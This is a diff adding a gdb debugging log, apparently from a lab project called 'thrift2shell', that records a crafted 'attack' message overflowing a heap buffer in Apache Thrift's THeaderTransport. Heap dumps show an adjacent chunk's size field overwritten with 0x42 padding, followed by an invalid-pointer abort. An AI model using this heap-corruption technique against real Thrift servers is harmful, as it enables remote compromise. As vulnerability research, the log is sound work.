@@ -1,0 +1,29 @@
+Breakpoint 1 at 0x19476: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/live/thrift-0.23.0/lib/cpp/src/thrift/transport/THeaderTransport.cpp, line 301.
+Breakpoint 2 at 0x19594: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/live/thrift-0.23.0/lib/cpp/src/thrift/transport/THeaderTransport.cpp, line 307.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+LISTENING 127.0.0.1:29385
+PRE ptr=0x5555555b90de sz=726 rbuf=0x5555555b90d0 rbufsz=68 tbuf=0x5555555b9120 tbufsz=1024 delta=80
+0x5555555b90c0:	0x0000000000000000	0x0000000000000051
+0x5555555b9110:	0x00000000ffb89cb2	0x0000000000000411
+0x5555555b90de:	0x78	0x9c	0x6b	0x60	0x64	0x60	0x64	0x60
+0x5555555b90e6:	0x60	0x60	0x4b	0x2c	0x29	0x49	0x4c	0xce
+POST ptr=0x5555555b90de sz=726 rbuf=0x5555555b90d0 tbuf=0x5555555b9120
+0x5555555b90de:	0x80	0x01	0x00	0x01	0x00	0x00	0x00	0x06
+0x5555555b90e6:	0x61	0x74	0x74	0x61	0x63	0x6b	0x00	0x00
+0x5555555b90f8:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0x5555555b9108:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0x5555555b9110:	0x7a42424242424242
+0x5555555b9118:	0x4242424242424242
+0x5555555b9120:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0x5555555b90c0:	0x0000000000000000	0x0000000000000051
+PROCESS_REACHED name=attack seqid=1
+Thrift: Mon Nov 23 10:20:31 2026 TSocket::write_partial() send() <Host: 127.0.0.1 Port: 43710>: Broken pipe
+Thrift: Mon Nov 23 10:20:31 2026 TConnectedClient input close failed: write() send(): Broken pipe
+Thrift: Mon Nov 23 10:20:31 2026 TSocket::write_partial() send() <Host: 127.0.0.1 Port: 43710>: Broken pipe
+Thrift: Mon Nov 23 10:20:31 2026 TConnectedClient output close failed: write() send(): Broken pipe
+munmap_chunk(): invalid pointer
+
+Program received signal SIGABRT, Aborted.
+__pthread_kill_implementation (no_tid=0, signo=6, threadid=<optimized out>) at ./nptl/pthread_kill.c:44
+warning: 44	./nptl/pthread_kill.c: No such file or directory
